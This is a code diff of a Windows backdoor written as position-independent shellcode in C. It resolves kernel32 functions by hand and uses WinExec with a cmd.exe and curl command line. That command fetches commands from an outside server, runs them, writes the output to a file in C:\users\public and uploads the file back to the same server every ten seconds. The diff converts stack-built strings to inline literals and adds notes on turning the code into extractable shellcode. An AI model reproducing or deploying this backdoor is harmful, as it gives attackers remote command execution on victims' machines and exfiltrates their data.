@@ -6,6 +6,7 @@
 //This code is called position independent code because it doesn't depend on a linker to resolve external dependencies like importing dlls and using functions inside.
 //This backdoor uses cmd to get commands from the c3 server after every 10 seconds and execute it on the system.
 //The executed command is saved into a text file and then uploaded back to the c3 server.
+//If we are not using stack-based strings, then we must inline-string in text section from data section for shellcode to work properly. I've used another tool for inlining strings: https://github.com/hasherezade/masm_shc
 //With the help of MSVC we can convert this code to .asm file and then link those assembly instructions to a binary.
 //After that we can extract shellcode from the .text section of that binary.
 
@@ -18,31 +19,27 @@
 int main()
 {
     // Stack based strings for libraries and functions the shellcode needs
-    wchar_t kernel32_dll_name[] = { 'k','e','r','n','e','l','3','2','.','d','l','l', 0 };
-    char load_lib_name[] = { 'L','o','a','d','L','i','b','r','a','r','y','A',0 };
-    char get_proc_name[] = { 'G','e','t','P','r','o','c','A','d','d','r','e','s','s', 0 };
-    //char user32_dll_name[] = { 'u','s','e','r','3','2','.','d','l','l', 0 };
-    char winexec_name[] = { 'W', 'i', 'n', 'E', 'x', 'e', 'c', 0 };
-    char sleep_name[] = { 'S','l','e','e','p', 0 };
+    //wchar_t kernel32_dll_name[] = { 'k','e','r','n','e','l','3','2','.','d','l','l', 0 };
 
     // stack based strings to be passed to the winexec api
     //This string_cmd takes commands from the c3 server, executes those commands on the system, saves the output in a text file and then uploads the output back to the c3 server!
-    char cmd[] = { 'c','m','d','.','e','x','e',' ','/','c',' ','"','f','o','r',' ','/','f',' ','"','d','e','l','i','m','s','=','"',' ','%','i',' ','i','n',' ','(','\'','c','u','r','l',' ','h','t','t','p','s',':','/','/','r','.','b','a','a','l','e','j','i','b','r','e','e','l','.','c','o','m','/','s','h','a','d','d','y','/','d','a','t','a','.','p','h','p','\'',')',' ','d','o',' ','s','e','t',' ','o','u','t','p','u','t','=','%','i',' ','&','&',' ','%','i',' ','>',' ','C',':','\\','u','s','e','r','s','\\','p','u','b','l','i','c','\\','t','e','m','p','.','t','x','t',' ','&','&',' ','c','u','r','l',' ','-','-','f','o','r','m',' ','"','f','i','l','e','T','o','U','p','l','o','a','d','=','@','C',':','\\','u','s','e','r','s','\\','p','u','b','l','i','c','\\','t','e','m','p','.','t','x','t','"',' ','h','t','t','p','s',':','/','/','r','.','b','a','a','l','e','j','i','b','r','e','e','l','.','c','o','m','/','s','h','a','d','d','y','/','g','e','t','f','i','l','e','.','p','h','p','"',' ','"', 0};
+    //char cmd[] = { 'c','m','d','.','e','x','e',' ','/','c',' ','"','f','o','r',' ','/','f',' ','"','d','e','l','i','m','s','=','"',' ','%','i',' ','i','n',' ','(','\'','c','u','r','l',' ','h','t','t','p','s',':','/','/','r','.','b','a','a','l','e','j','i','b','r','e','e','l','.','c','o','m','/','s','h','a','d','d','y','/','d','a','t','a','.','p','h','p','\'',')',' ','d','o',' ','s','e','t',' ','o','u','t','p','u','t','=','%','i',' ','&','&',' ','%','i',' ','>',' ','C',':','\\','u','s','e','r','s','\\','p','u','b','l','i','c','\\','t','e','m','p','.','t','x','t',' ','&','&',' ','c','u','r','l',' ','-','-','f','o','r','m',' ','"','f','i','l','e','T','o','U','p','l','o','a','d','=','@','C',':','\\','u','s','e','r','s','\\','p','u','b','l','i','c','\\','t','e','m','p','.','t','x','t','"',' ','h','t','t','p','s',':','/','/','r','.','b','a','a','l','e','j','i','b','r','e','e','l','.','c','o','m','/','s','h','a','d','d','y','/','g','e','t','f','i','l','e','.','p','h','p','"',' ','"', 0};
+    LPCSTR cmd = "cmd.exe /c \"for /f \"delims=\" %i in ('curl https://r.baalejibreel.com/shaddy/data.php') do set output=%i && %i > C:\\users\\public\\temp.txt && curl --form \"fileToUpload=@C:\\users\\public\\temp.txt\" https://r.baalejibreel.com/shaddy/getfile.php\" ";
 
 	// resolve kernel32 image base
-    LPVOID base = get_module_by_name((const LPWSTR)kernel32_dll_name);
+    LPVOID base = get_module_by_name((const LPWSTR)L"kernel32.dll");
     if (!base) {
         return 1;
     }
 
     // resolve loadlibraryA() address
-    LPVOID load_lib = get_func_by_name((HMODULE)base, (LPSTR)load_lib_name);
+    LPVOID load_lib = get_func_by_name((HMODULE)base, (LPSTR)"LoadLibraryA");
     if (!load_lib) {
         return 2;
     }
 
     // resolve getprocaddress() address
-    LPVOID get_proc = get_func_by_name((HMODULE)base, (LPSTR)get_proc_name);
+    LPVOID get_proc = get_func_by_name((HMODULE)base, (LPSTR)"GetProcAddress");
     if (!get_proc) {
         return 3;
     }
@@ -56,15 +53,13 @@ int main()
         _In_ LPCSTR lpCmdLine,
         _In_ UINT uCmdShow) = (UINT (WINAPI*)(
             _In_ LPCSTR,
-            _In_ UINT)) _GetProcAddress((HMODULE)base, winexec_name);
+            _In_ UINT)) _GetProcAddress((HMODULE)base, (LPCSTR)"WinExec");
 
     if (_WinExec == NULL) return 4;
 
-    //UINT return_val = _WinExec(cmd, 0);
-
     VOID(WINAPI * _Sleep)(
         _In_ DWORD dwMilliseconds) = (VOID (WINAPI*)(
-            _In_ DWORD)) _GetProcAddress((HMODULE)base, sleep_name);
+            _In_ DWORD)) _GetProcAddress((HMODULE)base, (LPCSTR)"Sleep");
 
     if (_Sleep == NULL) return 5;
 
